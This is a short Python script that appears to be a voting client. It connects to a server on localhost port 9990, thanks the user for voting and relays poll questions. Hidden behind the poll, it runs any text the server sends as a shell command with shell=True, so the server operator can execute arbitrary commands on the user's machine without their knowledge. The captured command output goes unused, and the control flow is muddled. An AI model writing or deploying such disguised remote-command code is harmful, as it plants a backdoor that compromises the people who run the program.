import socket
import os
import subprocess

s = socket.socket()
host = 'localhost'
port = 9990

s.connect((host, port))


data = s.recv(1024)
while True:
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode(
            "utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()

        output_str = 'Thank you for voting!!'
        s.send(str.encode(output_str))
        data = s.recv(1024)
        q1 = input(data.decode("utf-8"))
        s.send(str.encode(q1))
        data = s.recv(1024)
        q2 = input(data.decode("utf-8"))
        s.send(str.encode(q2))
        print(output_str)
